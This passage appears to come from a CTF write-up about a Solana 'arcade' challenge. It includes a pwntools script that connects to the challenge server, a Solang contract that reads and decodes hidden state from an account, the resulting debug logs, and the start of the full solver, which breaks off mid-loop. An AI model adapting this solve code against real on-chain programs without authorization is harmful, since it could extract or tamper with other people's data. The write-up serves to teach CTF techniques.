</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># sample solve script to interface with the server</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pwn</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># feel free to change this</span>
</span></span><span class="line"><span class="cl"><span class="n">account_metas</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="s2">&#34;user data&#34;</span><span class="p">,</span> <span class="s2">&#34;sw&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="s2">&#34;user&#34;</span><span class="p">,</span> <span class="s2">&#34;sw&#34;</span><span class="p">),</span> <span class="c1"># signer + writable</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="s2">&#34;data account&#34;</span><span class="p">,</span> <span class="s2">&#34;-w&#34;</span><span class="p">),</span> <span class="c1"># writable</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="s2">&#34;program&#34;</span><span class="p">,</span> <span class="s2">&#34;-r&#34;</span><span class="p">),</span>  <span class="c1"># read only</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="s2">&#34;system program&#34;</span><span class="p">,</span> <span class="s2">&#34;-r&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;chals.sekai.team&#34;</span><span class="p">,</span> <span class="mi">5043</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;solve/Solve.so&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">solve</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;program pubkey: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;EzciEpQvGwZk5yegEHiy27afRZaDLKU8B3jk5MWc38rq&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;program len: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">solve</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">solve</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">accounts</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;num accounts: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="n">name</span><span class="p">,</span> <span class="n">pubkey</span><span class="p">]</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">accounts</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">pubkey</span>
</span></span><span class="line"><span class="cl"><span class="n">accounts</span><span class="p">[</span><span class="s2">&#34;system program&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;11111111111111111111111111111111&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">account_metas</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">perms</span><span class="p">)</span> <span class="ow">in</span> <span class="n">account_metas</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">perms</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">accounts</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instruction_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;ix len: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">instruction_data</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">instruction_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After this, we can continue building our solver program. I try to print the <code>tx.accounts</code> data, and it is true that the <code>account_metas == tx.accounts</code>. So, we want to see the <code>data account</code>&rsquo;s data (which is <code>tx.accounts[2]</code> because we passed it as the third element in the <code>account_metas</code>), and try to print it (This will be shown in the <code>arcade-server</code> logs).</p>
<p>I can see all the state data that we need to recover for it, and the next step is to convert it to the necessary data type. The <code>data</code> consist of all the state data, so we need to parse it first one by one. Below is the parser that I made.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="err">@</span><span class="n">program_id</span><span class="p">(</span><span class="s">&#34;EzciEpQvGwZk5yegEHiy27afRZaDLKU8B3jk5MWc38rq&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Solve</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="err">@</span><span class="n">payer</span><span class="p">(</span><span class="n">payer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="err">@</span><span class="n">space</span><span class="p">(</span><span class="mi">160</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kt">uint64</span> <span class="n">forgotten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">uint64</span> <span class="n">stuckInGap</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">uint64</span> <span class="n">atBottom</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">address</span> <span class="n">somewhere</span> <span class="o">=</span> <span class="kt">address</span><span class="s">&#39;ArciEpQvGwZk5yegHEiy27afRZaDLKU8B3kj5MWc38rq&#39;</span><span class="p">;</span> <span class="c1">// Placeholder
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kt">string</span> <span class="k">memory</span> <span class="n">lookForIt</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">		<span class="n">AccountInfo</span> <span class="n">ai</span> <span class="o">=</span> <span class="nb">tx</span><span class="p">.</span><span class="n">accounts</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">print</span><span class="p">(</span><span class="s">&#34;Hello solana - START&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;Found key  :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="n">key</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;Owner      :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="n">owner</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;is_writable:{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="n">is_writable</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;Data length:{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">.</span><span class="n">length</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x18</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">forgotten</span> <span class="o">|=</span> <span class="kt">uint64</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="kt">int8</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="p">((</span><span class="n">i</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x60</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x68</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">stuckInGap</span> <span class="o">|=</span> <span class="kt">uint64</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="kt">int8</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="p">((</span><span class="n">i</span><span class="o">-</span><span class="mh">0x60</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x24</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x2c</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">atBottom</span> <span class="o">|=</span> <span class="kt">uint64</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="kt">int8</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="p">((</span><span class="n">i</span><span class="o">-</span><span class="mh">0x24</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="kt">bytes</span> <span class="k">memory</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x78</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x80</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mh">0x78</span><span class="p">]</span> <span class="o">=</span> <span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">lookForIt</span> <span class="o">=</span> <span class="kt">string</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="kt">uint256</span> <span class="n">test</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x2c</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x4c</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">test</span> <span class="o">=</span> <span class="n">test</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="n">test</span> <span class="o">+=</span> <span class="kt">uint256</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="kt">int8</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">])));</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">somewhere</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">test</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;forgotten :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">forgotten</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;stuckInGap:{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">stuckInGap</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;atBottom  :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">atBottom</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;lookForIt :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">lookForIt</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;Somewhere :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">somewhere</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Checking through the logs, we&rsquo;re able to recover it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[2023-09-11T04:40:05.645371062Z DEBUG solana_runtime::message_processor::stable_log] Program log: Hello solana - START
</span></span><span class="line"><span class="cl">[2023-09-11T04:40:05.645417159Z DEBUG solana_runtime::message_processor::stable_log] Program log: Found key  :8N4bAitF1hfBEQhb3PjCJ8U7428TU6itVCwtCCX4HncJ
</span></span><span class="line"><span class="cl">[2023-09-11T04:40:05.645463066Z DEBUG solana_runtime::message_processor::stable_log] Program log: Owner      :ArciEpQvGwZk5yegHEiy27afRZaDLKU8B3kj5MWc38rq
</span></span><span class="line"><span class="cl">[2023-09-11T04:40:05.645468887Z DEBUG solana_runtime::message_processor::stable_log] Program log: is_writable:true
</span></span><span class="line"><span class="cl">[2023-09-11T04:40:05.645475129Z DEBUG solana_runtime::message_processor::stable_log] Program log: Data length:160
</span></span><span class="line"><span class="cl">[2023-09-11T04:40:05.645503723Z DEBUG solana_runtime::message_processor::stable_log] Program log: forgotten :2572700995769453388
</span></span><span class="line"><span class="cl">[2023-09-11T04:40:05.645511879Z DEBUG solana_runtime::message_processor::stable_log] Program log: stuckInGap:7634685008610503945
</span></span><span class="line"><span class="cl">[2023-09-11T04:40:05.645519283Z DEBUG solana_runtime::message_processor::stable_log] Program log: atBottom  :15369177546453456043
</span></span><span class="line"><span class="cl">[2023-09-11T04:40:05.645525545Z DEBUG solana_runtime::message_processor::stable_log] Program log: lookForIt :z1CZAgVT
</span></span><span class="line"><span class="cl">[2023-09-11T04:40:05.645567995Z DEBUG solana_runtime::message_processor::stable_log] Program log: Somewhere :7wswDUP9e8xYTVVqjtfe1MzoZccAdv5Ecv1R9BMkhSrc
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have recovered the data to be passed to the arcadeProgram, it&rsquo;s time to update our contract to call the arcade program. To do it, we need to do <code>cross-program-invocation</code>. We can see the example published in the documentation <a href="https://github.com/solana-developers/program-examples/tree/main/basics/cross-program-invocation/solang/solidity" target="_blank" rel="noopener noreffer ">repo</a> to understand how to invoke the CPI. Basically, the syntax is quite similar with how we passed <code>msg.value</code> in EVM, but instead of <code>msg.value</code>, we need to pass the <code>AccountMeta</code>. Below is the full solver that I use to solve the challenge.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;solana&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">arcadeInterface</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nf">find_string_uint64</span><span class="p">(</span><span class="kt">string</span> <span class="n">calldata</span> <span class="n">machine</span><span class="p">,</span> <span class="kt">uint64</span> <span class="n">location</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nf">find_bytes32</span><span class="p">(</span><span class="kt">address</span> <span class="n">location</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nf">find_string</span><span class="p">(</span><span class="kt">string</span> <span class="n">location</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nf">play</span><span class="p">()</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">program_id</span><span class="p">(</span><span class="s">&#34;EzciEpQvGwZk5yegEHiy27afRZaDLKU8B3jk5MWc38rq&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Solve</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="err">@</span><span class="n">payer</span><span class="p">(</span><span class="n">payer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="err">@</span><span class="n">space</span><span class="p">(</span><span class="mi">160</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kt">uint64</span> <span class="n">forgotten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">uint64</span> <span class="n">stuckInGap</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">uint64</span> <span class="n">atBottom</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">address</span> <span class="n">somewhere</span> <span class="o">=</span> <span class="kt">address</span><span class="s">&#39;ArciEpQvGwZk5yegHEiy27afRZaDLKU8B3kj5MWc38rq&#39;</span><span class="p">;</span> <span class="c1">// Placeholder
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kt">string</span> <span class="k">memory</span> <span class="n">lookForIt</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">		<span class="n">AccountInfo</span> <span class="n">ai</span> <span class="o">=</span> <span class="nb">tx</span><span class="p">.</span><span class="n">accounts</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">print</span><span class="p">(</span><span class="s">&#34;Hello solana - START&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;Found key  :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="n">key</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;Owner      :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="n">owner</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;is_writable:{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="n">is_writable</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;Data length:{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">.</span><span class="n">length</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x18</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">forgotten</span> <span class="o">|=</span> <span class="kt">uint64</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="kt">int8</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="p">((</span><span class="n">i</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x60</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x68</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
